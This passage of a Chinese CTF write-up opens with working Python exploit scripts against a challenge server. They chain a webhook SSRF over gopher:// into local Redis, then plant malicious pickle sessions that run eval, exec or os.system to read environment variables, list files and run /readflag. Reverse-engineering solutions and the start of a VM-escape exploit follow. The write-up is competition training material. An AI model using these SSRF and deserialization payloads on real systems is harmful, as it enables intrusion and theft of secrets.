    url="gopher://2130706433:6379/_"+urllib.parse.quote(payload, safe='')
    r=requests.post(f"{base}/tasks/{T}/retry-webhook/", json={"url":url}, cookies=cookies, timeout=30)
    d=r.json(); log=d.get('log',{})
    return log.get('status_code'), log.get('error'), log.get('response_body')
def go(expr, marker):
    class P:
        def __reduce__(self):
            return (eval, (expr,))
    payload=pickle.dumps(P(), protocol=4)
    key=''.join(secrets.choice(string.ascii_lowercase+string.digits) for _ in range(32))
    raw(enc('SELECT','1')+enc('SET', ':1:django.contrib.sessions.cache'+key, payload, 'EX','600'))
    r=requests.get(base+'/dashboard/', cookies={'dp_session':key}, timeout=15, allow_redirects=False)
    time.sleep(0.3)
    sc,err,body=raw(enc('GET',marker))
    raw(enc('DEL',marker))
    return r.status_code, body
tests=[
 ("__import__('redis').Redis().set('pwn:s1','1')", 'pwn:s1'),
 ("(lambda r:(r.set('pwn:s2','2'),))(__import__('redis').Redis())", 'pwn:s2'),
 ("__import__('redis').Redis().set('pwn:s3', open('/proc/self/environ','rb').read(50).decode('latin1'))", 'pwn:s3'),
 ("__import__('redis').Redis().set('pwn:s4', __import__('os').getcwd())", 'pwn:s4'),
]
for e,m in tests:
    print(m, go(e,m))
```

文件系统探测的代码如下。

```python
import pickle, requests, urllib.parse, secrets, string, time, sys
base="http://1.14.76.59:17921"; T="dbdf22a1-fa2f-470a-9a57-ec7837bd61af"
cookies={}
for line in open('cookies.txt'):
    if line.startswith('#HttpOnly_'): line=line[len('#HttpOnly_'):]
    if line.startswith('#') or not line.strip(): continue
    f=line.strip().split('\t')
    if len(f)>=7: cookies[f[5]]=f[6]
def enc(*args):
    parts=[f"*{len(args)}\r\n".encode()]
    for a in args:
        b=a.encode() if isinstance(a,str) else a
        parts.append(b"$"+str(len(b)).encode()+b"\r\n"+b+b"\r\n")
    return b"".join(parts)
def raw(payload, retries=3):
    url="gopher://2130706433:6379/_"+urllib.parse.quote(payload, safe='')
    for i in range(retries):
        try:
            r=requests.post(f"{base}/tasks/{T}/retry-webhook/", json={"url":url}, cookies=cookies, timeout=30)
            d=r.json(); log=d.get('log',{})
            return log.get('status_code'), log.get('error'), log.get('response_body')
        except Exception as e:
            time.sleep(2)
    return None, 'REQFAIL', ''
def eval_payload(expr):
    class P:
        def __reduce__(self):
            return (eval, (expr,))
    return pickle.dumps(P(), protocol=4)
def run(expr, key, ttl=600):
    payload=eval_payload(expr)
    sk=''.join(secrets.choice(string.ascii_lowercase+string.digits) for _ in range(32))
    raw(enc('SELECT','1')+enc('SET', ':1:django.contrib.sessions.cache'+sk, payload, 'EX',str(ttl)))
    try:
        requests.get(base+'/dashboard/', cookies={'dp_session':sk}, timeout=20, allow_redirects=False)
    except Exception:
        pass
    time.sleep(0.4)
    sc,err,body=raw(enc('GET',key))
    return body
if __name__=="__main__":
    # listing first
    for expr,key in [
      ("__import__('redis').Redis().set('pwn:list', repr(__import__('os').getcwd())+'||'+repr(__import__('os').listdir('.'))+'||'+repr(__import__('os').listdir('/')))", 'pwn:list'),
      ("__import__('redis').Redis().set('pwn:env', open('/proc/self/environ','rb').read(1500).decode('latin1'))", 'pwn:env'),
    ]:
        print("==",key)
        body=run(expr,key)
        print((body or '')[:1900])
```

pickle gadget的代码如下。

```python
import pickle, requests, urllib.parse, secrets, string, sys, time
base="http://1.14.76.59:17921"; T="dbdf22a1-fa2f-470a-9a57-ec7837bd61af"
cookies={}
for line in open('cookies.txt'):
    if line.startswith('#HttpOnly_'): line=line[len('#HttpOnly_'):]
    if line.startswith('#') or not line.strip(): continue
    f=line.strip().split('\t')
    if len(f)>=7: cookies[f[5]]=f[6]
def enc(*args):
    parts=[f"*{len(args)}\r\n".encode()]
    for a in args:
        b=a.encode() if isinstance(a,str) else a
        parts.append(b"$"+str(len(b)).encode()+b"\r\n"+b+b"\r\n")
    return b"".join(parts)
def raw(payload):
    url="gopher://2130706433:6379/_"+urllib.parse.quote(payload, safe='')
    r=requests.post(f"{base}/tasks/{T}/retry-webhook/", json={"url":url}, cookies=cookies, timeout=30)
    d=r.json(); log=d.get('log',{})
    return log.get('status_code'), log.get('error'), log.get('response_body')
def plant(callable_obj, arg):
    class P:
        def __reduce__(self, c=callable_obj, a=arg):
            return (c, (a,))
    payload=pickle.dumps(P(), protocol=4)
    key=''.join(secrets.choice(string.ascii_lowercase+string.digits) for _ in range(32))
    raw(enc('SELECT','1')+enc('SET', ':1:django.contrib.sessions.cache'+key, payload, 'EX','600'))
    r=requests.get(base+'/dashboard/', cookies={'dp_session':key}, timeout=15, allow_redirects=False)
    return r.status_code
def check(marker):
    sc,err,body=raw(enc('GET', marker))
    return body
import os
tests = {
 'eval-socket': (eval, "__import__('socket').create_connection(('127.0.0.1',6379),3).sendall(b'SET pwn:test evalok\\r\\n')"),
 'eval-redismod': (eval, "__import__('redis').Redis().set('pwn:test','redismodok')"),
 'os.system': (os.system, "python3 -c \"import socket;s=socket.create_connection(('127.0.0.1',6379),3);s.sendall(b'SET pwn:test sysok\\r\\n')\""),
 'exec': (exec, "import socket;socket.create_connection(('127.0.0.1',6379),3).sendall(b'SET pwn:test execok\\r\\n')"),
}
for name,(c,a) in tests.items():
    try:
        st=plant(c,a)
        time.sleep(0.5)
        body=check('pwn:test')
        print(name, "trigger:", st, "redis:", repr(body))
    except Exception as e:
        print(name, "EXC", type(e).__name__, str(e)[:200])
    # cleanup
    raw(enc('DEL','pwn:test'))
```

数据外带的代码如下。

```python
import pickle, requests, urllib.parse, secrets, string, json, time
base="http://1.14.76.59:17921"; T="dbdf22a1-fa2f-470a-9a57-ec7837bd61af"
cookies={}
for line in open('cookies.txt'):
    if line.startswith('#HttpOnly_'): line=line[len('#HttpOnly_'):]
    if line.startswith('#') or not line.strip(): continue
    f=line.strip().split('\t')
    if len(f)>=7: cookies[f[5]]=f[6]
def enc(*args):
    parts=[f"*{len(args)}\r\n".encode()]
    for a in args:
        b=a.encode() if isinstance(a,str) else a
        parts.append(b"$"+str(len(b)).encode()+b"\r\n"+b+b"\r\n")
    return b"".join(parts)
def raw(payload):
    url="gopher://2130706433:6379/_"+urllib.parse.quote(payload, safe='')
    r=requests.post(f"{base}/tasks/{T}/retry-webhook/", json={"url":url}, cookies=cookies, timeout=30)
    d=r.json(); log=d.get('log',{})
    return log.get('status_code'), log.get('error'), log.get('response_body')
paths="['/flag','/flag.txt','/app/flag','/app/flag.txt','/root/flag','/tmp/flag','/srv/flag','/home/flag','/opt/flag']"
expr = ("(lambda r,o:("
  "r.set('pwn:flag', __import__('json').dumps({p:(open(p,'rb').read(600).decode('latin1') if o.path.isfile(p) else None) for p in "+paths+"})),"
  "r.set('pwn:env', open('/proc/self/environ','rb').read(1900).decode('latin1')),"
  "r.set('pwn:cwd', repr(o.getcwd())+'|'+repr(o.listdir('.')[:80])+'|'+repr(o.listdir('/')[:80]))"
  "))(__import__('redis').Redis(), __import__('os'))")
class P:
    def __reduce__(self):
        return (eval, (expr,))
payload=pickle.dumps(P(), protocol=4)
print("pickle len", len(payload))
key=''.join(secrets.choice(string.ascii_lowercase+string.digits) for _ in range(32))
print("SET:", raw(enc('SELECT','1')+enc('SET', ':1:django.contrib.sessions.cache'+key, payload, 'EX','86400')))
r=requests.get(base+'/dashboard/', cookies={'dp_session':key}, timeout=20, allow_redirects=False)
print("trigger:", r.status_code)
time.sleep(0.5)
for k in ['pwn:flag','pwn:env','pwn:cwd']:
    sc,err,body=raw(enc('GET',k))
    print("==",k,sc,err,"len",len(body or ''))
    print((body or '')[:1900])
```

读取 flag的代码如下。

```python
import sys, time
sys.path.insert(0,'.')
from probe_fs import run, raw, enc
tests = [
 ("__import__('redis').Redis().set('pwn:flagtxt', (open('/flag.txt','rb').read(800).decode('latin1') if __import__('os').path.isfile('/flag.txt') else 'NOFILE'))", 'pwn:flagtxt'),
 ("__import__('redis').Redis().set('pwn:rf', __import__('subprocess').check_output(['/readflag']).decode('latin1'))", 'pwn:rf'),
 ("__import__('redis').Redis().set('pwn:rf2', __import__('os').popen('/readflag').read())", 'pwn:rf2'),
]
for expr,key in tests:
    print("==",key)
    body=run(expr,key)
    print((body or '')[:1900])
```

## REVERSE

### 千千的咲

千千的咲是一道 Android 逆向题。题目给出一个 APK，描述为可爱的千咲多摸摸他就可以拿到 flag，真机与模拟器均测试通过；运行后可以看到一张划分为 4×4 格子的千咲图片和底部的重新开始按钮。表面上这是点击小游戏，实际上每次点击都会进入一套由原生虚拟机和 WebAssembly 共同维护的状态机，最终的 flag 解密密钥与完整的点击历史有关。应用包名为 com.ctf.chisaki，包含 Unreal Engine 的 Activity 与体积很大的 libUnreal.so，Java 层主要是引擎启动代码，真正需要分析的是原生库和 UE 资源；题目同时提供 ARM64 与 x86_64 两个版本的原生库，模拟器使用 x86_64 版本。资源中的 main.obb.png 虽然使用 PNG 扩展名，实际是 ZIP 文件，解开后可以得到 UE 的资源容器，PAK 目录索引里能看到 Data/p.bin 以及一组 JavaScript 脚本，结合原生库中的 Puerts 相关代码可以判断题目嵌入了一层脚本运行环境。

原生库中的关键名称并非明文。库中有一个.r1 段记录了需要还原的数据区间，初始化函数会逐字节异或 0xA7，还原后可以看到 PuzzleScriptHost、SubmitCell、ResetState、IsComplete 等名称，并得到 16 字节密钥 qianqiandexiao99。原生代码还会检查 /proc/self/maps、线程名称、文件描述符和代码区摘要，用于检测 Frida 等调试环境；由于核心计算不依赖 Android 图形接口，后续选择离线仿真原始函数。沿着 Data/p.bin 的读取逻辑可以定位解密函数，它使用 TEA 系列的自定义变体，解密后检查 WebAssembly 文件头；p.bin 开头四字节为 8F 21 D6 B4，随后记录明文长度，偏移 8 开始的八字节参与分组链接。使用恢复出的密钥执行原始解密函数，可以得到一个 1406 字节、以 WASM 魔数开头的文件。

把 WASM 转成文本后可以看到模块只导入一个函数，并导出内存、重置、点击和取密钥数据四个接口；点击接口多次调用导入函数与原生代码交换中间状态。原生侧对应入口是 sub_481C236，操作码分别用于重置、取得状态值、进入原生虚拟机执行一次点击以及处理反馈并检查完成条件；原生虚拟机包含 30 个逻辑寄存器和 256 字节内存，寄存器在物理存储中还做了异或掩码。完成条件要求处理 3941 次点击，但仅仅点够次数并不能得到正确 flag，因为原生代码还维护一条 SHA-256 哈希链，更新关系为 H\_(n+1) 等于 SHA256(0x01 连接 H_n、八字节小端 n 与单字节 cell_n)；每次点击前还会计算 SHA256(0x03 连接 H_n 与 n)，取前 16 字节参与虚拟机交互。解题重点是恢复正确点击序列，而不是绕过计数。

继续分析原生虚拟机，可以在 0x869150 找到一张包含 493 条记录的状态表，每条记录由 21 个 32 位整数组成，前五个字段解密后保存点击变换的目标值、两个变换参数和两个后继节点，后十六个字段是八组虚拟机指令与参数；字段使用与入口状态有关的 32 位密钥掩码。掩码函数由右移异或和两个奇数乘法组成，在 32 位空间上可逆，因此可以逐层还原。恢复入口密钥时利用第四个字段的明文是 0 到 492 的后继编号这一约束，枚举目标值反推候选密钥，再用第五个字段过滤，493 条记录都能得到唯一密钥。起始节点是 444，其入口密钥为 0x6FEF75EB，前五项明文分别为 0xA0D88FB7、0x9C1AB9CA、0xD2AB1B9D、17 和 159。

最关键的步骤是逆转点击打包变换。原生函数把最多八次点击打包成一个 32 位整数，每次点击占四位，再进行四轮变换；状态表第一项保存的正是目标值。四轮变换由异或、模加、循环移位和强制奇数的乘法组成，全部可逆，因此从目标值出发按相反顺序逆推，就能直接恢复八次点击，不需要枚举十六的八次方种输入。把第一段目标值和参数代入后得到整数 0xDB5A14A5，按四位拆开就是第一次到第八次点击 5、10、4、1、10、5、11、13；重放这八次点击可以进入节点 17，再按当前节点读取记录、恢复参数并逆转，最终恢复 492 段八次点击和最后一段五次点击，共 3941 次。重放时必须保留 WASM 与原生虚拟机之间的反馈协议，按原顺序更新哈希状态、交互状态和寄存器，否则最终密钥仍然错误；实现上使用 Unicorn 加载原始 x86_64 ELF、处理 Android 压缩重定位并还原.r1 数据，再用 Node.js 实例化 WASM 并把导入函数转发到原生入口。

重放结束后点击接口返回完成状态，再取 32 字节 salt，最终派生过程为 digest 等于 SHA256(0x02 连接 H_3941、八字节小端 3941 与 salt)，密钥取 digest 前 16 字节，初始向量取后 16 字节。本题恢复出的 salt 为 04e6e9fa5e20e4b21b82511f1dd9d85e34df2ea090c312558ceefe4ff566d506，key 为 edf0907855a7dbcc5cb49787776133cd，iv 为 9a442b32986c690af07213508ae6c5ee。最终密文位于 0x869020，长 48 字节；解密函数使用修改过的 12 轮 AES-CBC，S-box、轮密钥扩展与行移位都与标准 AES 不同，替换表可表示为对标准 S-box 先异或 0xA7、循环左移一位、再异或 0x3D，行移位参数为 0、2、3、1，因此不能直接交给标准 AES 库。为避免重写变体算法出错，最终直接仿真原始解密函数及其外层校验函数，解密得到 34 字节 flag，后面跟十四个 0x0E 填充字节，明文长度与 FNV-1a-64 校验值 0xD59091F3EE56F409 同时通过，最终 flag 为 flag{WuTher1ng_Waves_ch1Sak1_6666}。

本题的关键代码、脚本与验证输出如下。

```latex
flag{WuTher1ng_Waves_ch1Sak1_6666}
```

```latex
qianqiandexiao99
```

```latex
H_(n+1) = SHA256(0x01 || H_n || LE64(n) || byte(cell_n))
```

```python
M = 0xFFFFFFFF

def mix(x):
    x &= M
    x ^= x >> 16
    x = x * 0x7FEB352D & M
    x ^= x >> 15
    x = x * 0x846CA68B & M
    return x ^ (x >> 16)

def mask(key, field):
    return mix(key ^ (((field + 1) * 0x9E3779B9) & M)
               ^ 0xA511E9B3)
```

```python
def undo_xor_shift(x, n):
    result = x
    for shift in range(n, 32, n):
        result ^= x >> shift
    return result

def unmix(x):
    x = undo_xor_shift(x, 16)
    x = x * pow(0x846CA68B, -1, 1 << 32) & M
    x = undo_xor_shift(x, 15)
    x = x * pow(0x7FEB352D, -1, 1 << 32) & M
    return undo_xor_shift(x, 16)
```

```python
candidates = []
for target in range(493):
    key = (unmix(row[3] ^ target)
           ^ ((4 * 0x9E3779B9) & M)
           ^ 0xA511E9B3)
    next_node = row[4] ^ mask(key, 4)
    if next_node < 493:
        candidates.append(key)

assert len(candidates) == 1
```

```python
t = mix(a ^ k ^ ((i * 0x9E3779B9) & M))
x = rol(((x ^ t) + rol(b, 3 + 5*i) + k) & M, 5 + 6*i)
x = x * (mix((b + i) & M) | 1) & M
```

```python
def rol(x, n):
    n &= 31
    return ((x << n) | (x >> ((-n) & 31))) & M

def inverse_fold(value, a, b, key):
    for i in range(3, -1, -1):
        factor = mix((b + i) & M) | 1
        value = value * pow(factor, -1, 1 << 32) & M
        value = rol(value, -(5 + 6*i))
        value = (value - rol(b, 3 + 5*i) - key) & M
        value ^= mix(a ^ key ^ ((i * 0x9E3779B9) & M))
    return value
```

```latex
5, 10, 4, 1, 10, 5, 11, 13
```

```latex
digest = SHA256(0x02 || H_3941 || LE64(3941) || salt)
key = digest[0:16]
iv  = digest[16:32]
```

```latex
salt = 04e6e9fa5e20e4b21b82511f1dd9d85e34df2ea090c312558ceefe4ff566d506
key  = edf0907855a7dbcc5cb49787776133cd
iv   = 9a442b32986c690af07213508ae6c5ee
```

### VVMM

VVMM是一道 Windows 逆向题。题目提供的样本是去除符号的 PE32+ x86-64 控制台程序，通过加密字节码驱动自定义虚拟机校验输入。样本 SHA-256 为 cc222acda86a869ae53d4fe1c0144a54190f756e4ecd170bedbb7deac5ae2c16；程序字符串中出现 --check 候选输入、\[vm\] ACCEPT、\[vm\] REJECT 以及虚拟机执行状态输出，说明主要校验在虚拟机中。分析时先加载样本查看概况，再反编译和反汇编追踪校验函数，可以定位到从 VMC2 容器解密并选择有效字节码的函数位于 0x140002940，加密容器起始于 0x140006F60，容器长度为 0x4e30，虚拟机解释器位于 0x140003480，32 位混合函数位于 0x140002CE0，MIX 指令的字节变换函数位于 0x140002D10。解释器的反编译结果带有栈指针分析告警，开头调用的 0x140002410 实际是栈探测辅助函数，因此不能直接把反编译器推断的无参数原型当作真实调用约定；结合调用位置和指令逻辑，可以看出解释器接收候选输入、输入长度和可选的执行报告指针。

字节码并非明文存放。解密函数首先检查容器头的四字节魔数 VMC2，从偏移 8 开始遍历记录；每条记录依次包含四字节小端 seed、一字节 key、一字节未使用字段、两字节小端密文长度、四字节小端校验和以及密文。记录中第 j 个字节的解密过程为：先把 seed 异或 key，再异或 j 乘以 73244475 的 32 位截断值，再异或 0x9e3779b9；然后做两次乘法和两次右移异或的混合，最后把密文字节异或混合值的相应字节，并异或 (seed 右移 11 位) 加 key 减 89 乘 j 的结果，截断到 8 位。解密后还要计算校验和：以 seed、key 与 0x811c9dc5 的异或为初值，对明文字节依次做乘 16777619、异或字节、再异或右移 13 位的更新。有效记录必须满足校验和等于混合值异或长度，明文首字节为 1，偏移 4 处的小端整数为 0xc0def00d。按这些条件处理容器后，第 0 条记录长 288 字节但未通过有效程序检查，第 1 条记录长 19696 字节并通过检查，包含 2462 个八字节指令单元。

虚拟机的每个指令单元使用操作码、三个单字节字段和四字节小端立即数组成，寄存器编号取字段的低三位；虚拟机有 8 个 32 位寄存器、128 字节内存和一个比较标志，第 0 个单元承载程序头，解释器从指令索引 1 开始执行。主要指令包括空操作、长度比较、输入读取、内存读写、寄存器赋立即数、32 位异或加乘、仅对最低字节循环移位、寄存器间异或与相加、由立即数控制的 MIX 字节变换、低字节或完整 32 位比较、条件与无条件相对跳转以及接受和拒绝；跳转目标为当前指令索引加一加有符号立即数，解释器限制最多执行两万条指令。MIX 函数由立即数决定参数，内部使用乘法、异或和右移混合，再对输入低字节做循环移位、模 256 加法和异或，对于固定的立即数它是一个字节置换；反编译器把一些调用前后仍保留的寄存器值显示成未初始化变量，需要结合汇编确认寄存器和低字节旋转操作。

程序首先比较输入长度，把 31 字节输入逐字节经过异或、加法、最低字节循环移位和 MIX 后写入内存前 31 个位置；随后进行 7 轮原地更新，每轮按位置 0 到 30 的顺序覆盖内存字节，每次更新读取当前位置、下一位置和偏移 7 的位置，做加法、异或、循环移位、MIX 和模 256 加法后写回，旋转位数、MIX 参数与加法常量随位置和轮数变化。由于是原地更新，一轮中后面的操作可能读到本轮已经覆盖的值，不能把整轮视为同时更新。程序最后把内存前 31 字节逐个与常量比较，任一不相等就跳转到拒绝分支，全部通过则接受；比较目标为 fd bd 28 ce b1 91 f6 39 d7 e5 31 8e 96 d7 02 15 f0 9b 38 bd e7 cd c7 ab 89 a3 3c 29 b7 18 2a。

恢复输入时不需要枚举整个 flag。每次原地更新只覆盖一个字节，其他参与运算的位置与被覆盖位置不同，因此从最后一个写回指令向前处理时，其他位置当前保存的值恰好就是这条更新执行时使用的值；枚举被覆盖字节的旧值 0 到 255，正向执行对应的小块指令，检查输出是否等于当前已知目标，即可恢复旧值并写回。这个顺序同时解决了轮内覆盖依赖。反向恢复完 7 轮共 217 次更新后，再对最初的 31 个输入预处理块逐个枚举原输入字节，总共逆向 248 个字节变换，每个变换至多尝试 256 个值，实际每一步都恰好只有一个候选。用按解释器语义实现的 Python 虚拟机正向验证恢复出的输入，执行 2460 步后到达字节偏移 0x4ce0 的接受分支，修改首字节或删去末尾字符都会到达拒绝分支，最终 flag 为 flag{J1nxI_i5_4_6eautiful_g1rl}。

本题的关键代码、脚本与验证输出如下。

```latex
flag{J1nxI_i5_4_6eautiful_g1rl}
```

```python
x = (seed ^ key) ^ u32(j * 73244475) ^ 0x9e3779b9
x = u32(2146121005 * (x ^ (x >> 16)))
x = u32(-2073254261 * (x ^ (x >> 15)))
x ^= x >> 16
plain[j] = (
    cipher[j]
    ^ (x >> (8 * (j & 3)))
    ^ ((seed >> 11) + key - 89 * j)
) & 0xff
```

```python
h = seed ^ key ^ 0x811c9dc5
for byte in plain:
    h = u32(16777619 * (byte ^ h))
    h ^= h >> 13
```

```python
def mix(index, value):
    x = u32(index * 0x9e3779b9) ^ u32(0xa5 + 0x6d2b79f5)
    x = u32((x ^ (x >> 16)) * 0x85ebca6b)
    x = u32((x ^ (x >> 13)) * 0xc2b2ae35)
    x ^= x >> 16
    return (
        (rol8(value ^ x, 3 * index + 1) + 49 * index + 66)
        ^ ((x & 0xff) >> 1)
    ) & 0xff
```

```latex
0000 NOP     r0 r0 00 c0def00d
0001 LEN     r0 r0 00 0000001f
0002 JNZ     r0 r0 00 0000099a -> 099d
0003 INPUT   r0 r0 00 00000000
0004 XORI    r0 r0 00 000000fb
0005 ADDI    r0 r0 00 0000006a
0006 ROL8    r0 r0 00 00000004
0007 MIX     r0 r0 00 00000000
0008 STORE   r0 r0 00 00000000
```

```latex
011a LOAD    r0 r0 00 00000000
011b LOAD    r1 r0 00 00000001
011c ADDR    r0 r1 00 00000000
011d LOAD    r1 r0 00 00000007
011e XORR    r0 r1 00 00000000
011f ROL8    r0 r0 00 00000002
0120 MIX     r0 r0 00 00000040
0121 ADDI    r0 r0 00 0000005a
0122 STORE   r0 r0 00 00000000
```

```latex
t = (memory[0] + memory[1]) XOR memory[7]
memory[0] = (MIX(0x40, ROL8(t, 2)) + 0x5a) & 0xff
```

```latex
fd bd 28 ce b1 91 f6 39 d7 e5 31 8e 96 d7 02 15
f0 9b 38 bd e7 cd c7 ab 89 a3 3c 29 b7 18 2a
```

```python
from pathlib import Path
import struct
import pefile

ROOT = Path(__file__).resolve().parent
MASK = 0xffffffff

def u32(x):
    return x & MASK

def decode_program():
    pe = pefile.PE(str(ROOT / 'VVMM.exe'))
    data = pe.get_data(0x6f60, 0x4e30)
    assert data[:4] == b'VMC2'
    pos = 8
    for record in range(data[4]):
        seed, key, unused, size, checksum = struct.unpack_from('<IBBHI', data, pos)
        enc = data[pos+12:pos+12+size]
        dec = bytearray()
        for j, byte in enumerate(enc):
            x = (seed ^ key) ^ u32(j * 73244475) ^ 0x9e3779b9
            x = u32(2146121005 * (x ^ (x >> 16)))
            x = u32(-2073254261 * (x ^ (x >> 15)))
            x ^= x >> 16
            dec.append((byte ^ (x >> (8 * (j & 3))) ^ ((seed >> 11) + key - 89*j)) & 255)
        h = seed ^ key ^ 0x811c9dc5
        for byte in dec:
            h = u32(16777619 * (byte ^ h))
            h ^= h >> 13
        valid = checksum == (h ^ size) and dec[0] == 1 and struct.unpack_from('<I', dec, 4)[0] == u32(-1059131379)
        print(f'record={record} size={size} valid={valid}')
        if valid:
            return bytes(dec)
        pos += 12 + size
    raise ValueError('No valid record')

NAMES = {0:'NOP',1:'NOP',0x10:'LEN',0x11:'INPUT',0x12:'LOAD',0x13:'STORE',0x20:'MOV',0x21:'XORI',0x22:'ADDI',0x23:'MULI',0x24:'ROL8',0x25:'ROR8',0x26:'XORR',0x27:'ADDR',0x30:'MIX',0x40:'CMP8',0x41:'CMP32',0x50:'JNZ',0x51:'JMP',0xf0:'ACCEPT',0xf1:'REJECT'}

def instructions(program):
    return [struct.unpack_from('<BBBBI', program, i) for i in range(0,len(program),8)]

def listing(program):
    lines = []
    for i, (op,a,b,c,imm) in enumerate(instructions(program)):
        extra = f' -> {i+1+struct.unpack("<i",struct.pack("<I",imm))[0]:04x}' if op in (0x50,0x51) else ''
        lines.append(f'{i:04x} {NAMES.get(op,hex(op)):7} r{a} r{b} {c:02x} {imm:08x}{extra}')
    return '\n'.join(lines)

def rol8(x, n):
    n &= 7
    x &= 255
    return ((x << n) | (x >> ((8-n) & 7))) & 255

def mix(index, value):
    x = u32(index * 0x9e3779b9) ^ u32(0xa5 + 0x6d2b79f5)
    x = u32((x ^ (x >> 16)) * 0x85ebca6b)
    x = u32((x ^ (x >> 13)) * 0xc2b2ae35)
    x ^= x >> 16
    return ((rol8(value ^ x, 3*index+1) + 49*index + 66) ^ ((x & 255) >> 1)) & 255

def execute_block(block, memory, candidate=b''):
    regs = [0] * 8
    for op, a, b, _, imm in block:
        a &= 7
        b &= 7
        if op in (0,1): pass
        elif op == 0x11: regs[a] = candidate[imm] if imm < len(candidate) else 0
        elif op == 0x12: regs[a] = memory[imm & 127]
        elif op == 0x13: memory[imm & 127] = regs[a] & 255
        elif op == 0x20: regs[a] = imm
        elif op == 0x21: regs[a] ^= imm
        elif op == 0x22: regs[a] = u32(regs[a] + imm)
        elif op == 0x23: regs[a] = u32(regs[a] * imm)
        elif op == 0x24: regs[a] = (regs[a] & 0xffffff00) | rol8(regs[a], imm)
        elif op == 0x25: regs[a] = (regs[a] & 0xffffff00) | rol8(regs[a], -imm)
        elif op == 0x26: regs[a] ^= regs[b]
        elif op == 0x27: regs[a] = u32(regs[a] + regs[b])
        elif op == 0x30: regs[a] = mix(imm, regs[a] & 255)
        else: raise ValueError(hex(op))
    return regs

def solve(program):
    code = instructions(program)
    length = code[1][4]
    first_check = next(i for i, ins in enumerate(code) if ins[0] == 0x40)
    memory = [((i*49+23) & 255) ^ 0xa5 for i in range(128)]
    for i in range(first_check, len(code)):
        if code[i][0] == 0x40:
            assert code[i-1][0] == 0x12
            memory[code[i-1][4]] = code[i][4] & 255
    flag = bytearray(length)
    count = 0
    for i in reversed(range(first_check)):
        if code[i][0] != 0x13:
            continue
        slot = code[i][4] & 127
        target = memory[slot]
        start = i-1
        while code[start][0] not in (0x11,0x12) or code[start][1] != 0:
            start -= 1
        block = code[start:i+1]
        matches = []
        for value in range(256):
            trial = memory.copy()
            trial[slot] = value
            candidate = bytearray(length)
            if code[start][0] == 0x11:
                candidate[code[start][4]] = value
            execute_block(block, trial, candidate)
            if trial[slot] == target:
                matches.append(value)
        assert len(matches) == 1, (i, matches)
        if code[start][0] == 0x11:
            flag[code[start][4]] = matches[0]
        else:
            assert code[start][4] == slot
            memory[slot] = matches[0]
        count += 1
    print(f'Reversed {count} byte transformations')
    return bytes(flag)

def verify(program, candidate):
    code = instructions(program)
    memory = [((i*49+23) & 255) ^ 0xa5 for i in range(128)]
    regs = [0] * 8
    zero, pc, steps = False, 1, 0
    while steps < 20000 and 0 <= pc < len(code):
        ins = code[pc]
        op,a,b,c,imm = ins
        a &= 7
        steps += 1
        if op == 0x10: zero = len(candidate) == imm
        elif op == 0x40: zero = (regs[a] & 255) == (imm & 255)
        elif op == 0x41: zero = regs[a] == imm
        elif op in (0x50,0x51):
            if op == 0x51 or not zero:
                pc += struct.unpack('<i', struct.pack('<I',imm))[0]
        elif op in (0xf0,0xf1):
            return op == 0xf0, steps, pc*8
        else:
            # Preserve all registers across instructions.
            if op == 0x11: regs[a] = candidate[imm] if imm < len(candidate) else 0
            elif op == 0x12: regs[a] = memory[imm & 127]
            elif op == 0x13: memory[imm & 127] = regs[a] & 255
            elif op == 0x20: regs[a] = imm
            elif op == 0x21: regs[a] ^= imm
            elif op == 0x22: regs[a] = u32(regs[a]+imm)
            elif op == 0x23: regs[a] = u32(regs[a]*imm)
            elif op == 0x24: regs[a] = (regs[a] & 0xffffff00) | rol8(regs[a],imm)
            elif op == 0x25: regs[a] = (regs[a] & 0xffffff00) | rol8(regs[a],-imm)
            elif op == 0x26: regs[a] ^= regs[b & 7]
            elif op == 0x27: regs[a] = u32(regs[a]+regs[b & 7])
            elif op == 0x30: regs[a] = mix(imm,regs[a] & 255)
            elif op not in (0,1): raise ValueError(hex(op))
        pc += 1
    raise ValueError('VM execution limit')

if __name__ == '__main__':
    program = decode_program()
    (ROOT / 'program.bin').write_bytes(program)
    (ROOT / 'program.asm').write_text(listing(program)+'\n')
    print(f'Decoded {len(program)} bytes ({len(program)//8} instructions)')
    flag = solve(program)
    print('flag:', flag.decode())
    result = verify(program,flag)
    assert result[0]
    print(f'Forward VM verification: ACCEPT, steps={result[1]}, pc={result[2]:#x}')
    assert not verify(program, b'X'+flag[1:])[0]
    assert not verify(program, flag[:-1])[0]
    print('Negative checks: changed byte and wrong length both REJECT')
    (ROOT / 'flag.txt').write_text(flag.decode()+'\n')
```

```latex
record=0 size=288 valid=False
record=1 size=19696 valid=True
Decoded 19696 bytes (2462 instructions)
Reversed 248 byte transformations
flag: flag{J1nxI_i5_4_6eautiful_g1rl}
Forward VM verification: ACCEPT, steps=2460, pc=0x4ce0
Negative checks: changed byte and wrong length both REJECT
```

```latex
flag{J1nxI_i5_4_6eautiful_g1rl}
```

## PWN

### FedResNyFinLedgerOs

FedResNyFinLedgerOs是一道虚拟机逃逸题。题目提供的 vm 是 static-PIE 的 x86-64 ELF，扮演一台 16 位自定义虚拟机 YOLOOS 的宿主模拟器，并安装了只允许 read、write、open、close、exit 的 seccomp；此外还提供虚拟机的镜像与磁盘。攻击面在于 guest 程序通过系统调用与宿主内核交互，而宿主内核的缓冲区校验存在缺陷，形成从 guest 到 kernel 再到 host 的两层跨越。

第一阶段是把 guest 的读写变成内核栈覆盖。用虚拟机内置的汇编器写一个 guest 程序，调用读系统调用，把 0x200 字节读入地址 0x3e00；内核的 v2 缓冲区校验允许 0x3000 到 0xefff 的区间，于是这批数据被直接拷贝到内核自己的活动栈上，覆盖 0x3ffe 处的返回槽。把返回槽改写为内核 gadget MOV SP,R3; RET（地址 0x1ad1），栈就枢轴到攻击者控制的链上。第二阶段由内核链跳转到 cache store 循环 0x1331，向 MMIO cache 偏移 0x248 到 0xcff 连续写入；ZCACHE 实际映射了宿主栈的 0xd00 字节，而内核只使用前 0x200 字节，因此偏移 0x248 正好落在宿主 main 函数的保存返回地址上。

